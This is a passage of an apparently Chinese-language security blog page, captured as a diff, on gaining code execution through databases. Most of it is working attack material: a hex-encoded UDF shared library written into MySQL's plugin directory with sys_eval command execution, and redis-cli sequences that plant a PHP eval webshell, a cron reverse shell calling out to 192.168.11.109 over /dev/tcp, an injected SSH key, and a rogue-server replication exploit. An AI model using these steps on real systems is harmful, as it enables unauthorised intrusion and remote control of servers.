12e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE &#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="创建恶意函数执行"><a href="#创建恶意函数执行" class="headerlink" title="创建恶意函数执行"></a>创建恶意函数执行</h3><p>create function <strong>sys_eval</strong> returns string SONAME ‘udf.so’;</p>
+<h3 id="执行命令RCE"><a href="#执行命令RCE" class="headerlink" title="执行命令RCE"></a>执行命令RCE</h3><p><strong>select sys_eval(‘id’);</strong></p>
+<h1 id="REDIS数据库安全"><a href="#REDIS数据库安全" class="headerlink" title="REDIS数据库安全"></a>REDIS数据库安全</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331135043052.png" alt="image-20250331135043052"></p>
+<h2 id="端口：6379"><a href="#端口：6379" class="headerlink" title="端口：6379"></a>端口：6379</h2><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1.写webshell"></a>1.写webshell</h3><p><em>当扫描到80端口时，且知道网站目录时可以采用此法。</em></p>
+<p>可以用navicat图形工具，也可以用kali命令</p>
+<p><strong>kali：</strong></p>
+<p>先连接REDIS</p>
+<p><strong>连接时注意host的末尾不能加&#x2F;</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">└─# redis-cli -h 10.2.2.10</span><br><span class="line">10.2.2.10:6379&gt; flushall   # 清除所有数据库的所有key</span><br><span class="line">10.2.2.10:6379&gt; set webshell &quot;\n\n\n&lt;?php eval($_REQUEST[1]);?&gt;\n&quot; </span><br><span class="line">10.2.2.10:6379&gt; config set dir /var/www/html   # 指定数据存储的路径</span><br><span class="line">10.2.2.10:6379&gt; config set dbfilename shell.php # 指定数据存储的文件名</span><br><span class="line">10.2.2.10:6379&gt; save # 存储数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331143432623.png" alt="image-20250331143432623"></p>
+<h3 id="2-写反弹shell"><a href="#2-写反弹shell" class="headerlink" title="2.写反弹shell"></a>2.写反弹shell</h3><p>连接REDIS</p>
+<p>然后本地开启监听</p>
+<p>之后写反弹shell</p>
+<p>10.2.2.10:6379&gt; flushall   # 清除所有数据库的所有key<br>10.2.2.10:6379&gt; set x “\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.11.109&#x2F;1234 0&gt;&amp;1\n”<br>10.2.2.10:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron   # 指定数据存储的路径<br>10.2.2.10:6379&gt; config set dbfilename root # 指定数据存储的文件名<br>10.2.2.10:6379&gt; save # 存储数据</p>
+<p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331150827811.png" alt="image-20250331150827811"></p>
+<p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331150606441.png" alt="image-20250331150606441"></p>
+<h3 id="3-写ssh公钥"><a href="#3-写ssh公钥" class="headerlink" title="3.写ssh公钥"></a>3.写ssh公钥</h3><p>ssh-keygen生成密钥</p>
+<p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331154025362.png" alt="image-20250331154025362"></p>
+<p>效果</p>
+<p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331154115150.png" alt="image-20250331154115150"></p>
+<p>然后连接REDIS之后写入<strong>公钥</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# cat /root/.ssh/id_ed25519.pub </span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICbbV6NUoFzJM1wFiveSsc6R38E1j9tzYyVb10hUpwlf root@kali</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─#redis-cli -h 10.2.2.10</span><br><span class="line">10.2.2.10:6379&gt; get *</span><br><span class="line">10.2.2.10:6379&gt; flushall</span><br><span class="line">10.2.2.10:6379&gt; set x &quot;\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICbbV6NUoFzJM1wFiveSsc6R38E1j9tzYyVb10hUpwlf root@kali\n&quot; </span><br><span class="line">10.2.2.10:6379&gt; config set dir /root/.ssh</span><br><span class="line">10.2.2.10:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">10.2.2.10:6379&gt; save </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后连接，发现无需密码。</p>
+<p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331154503413.png" alt="image-20250331154503413">	</p>
+<h3 id="4-主从复制"><a href="#4-主从复制" class="headerlink" title="4.主从复制"></a>4.主从复制</h3><p>​	主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</p>
+<p>Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</p>
+<p>编译得到exp.so恶意文件</p>
+<p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331195715024.png" alt="image-20250331195715024"></p>
+<p>运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rogue-server.py --rhost 10.3.4.137 --rport 6379 --lhost 192.168.230.27 --lport 8888</span><br></pre></td></tr></table></figure>
+
+<p>就连上了</p>
+<p><img src="/../images/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20250331195959109.png" alt="image-20250331195959109"></p>
+
+  </div>
+</article>
+
+  <div id="waline"></div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MS-SQL"><span class="toc-number">1.</span> <span class="toc-text">MS-SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E6%9C%89xp-cmdshell"><span class="toc-number">1.1.1.</span> <span class="toc-text">查看是否有xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFxp-cmdshell"><span class="toc-number">1.1.2.</span> <span class="toc-text">开启xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.1.3.</span> <span class="toc-text">RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-number">2.</span> <span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%EF%BC%9A3306"><span class="toc-number">2.1.</span> <span class="toc-text">默认端口：3306</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">udf提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5-so%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.1.</span> <span class="toc-text">写入.so文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8F%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">2.2.2.</span> <span class="toc-text">创建恶意函数执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4RCE"><span class="toc-number">2.2.3.</span> <span class="toc-text">执行命令RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REDIS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8"><span class="toc-number">3.</span> <span class="toc-text">REDIS数据库安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%EF%BC%9A6379"><span class="toc-number">3.2.</span> <span class="toc-text">端口：6379</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%86%99webshell"><span class="toc-number">3.3.1.</span> <span class="toc-text">1.写webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%99%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.2.</span> <span class="toc-text">2.写反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="toc-number">3.3.3.</span> <span class="toc-text">3.写ssh公钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">3.3.4.</span> <span class="toc-text">4.主从复制</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&text=数据库安全"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&is_video=false&description=数据库安全"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=数据库安全&body=Check out this article: http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&title=数据库安全"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&name=数据库安全&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/&t=数据库安全"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    h3x4
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+	  <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<script type="module">
+    import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js';
+
+    init({
+      el: '#waline',
+	  dark: '',
+	  reaction:'false',
+      serverURL: 'https://waline.baohuihua.xyz',
+    });
+  </script>
+</body>
+</html>
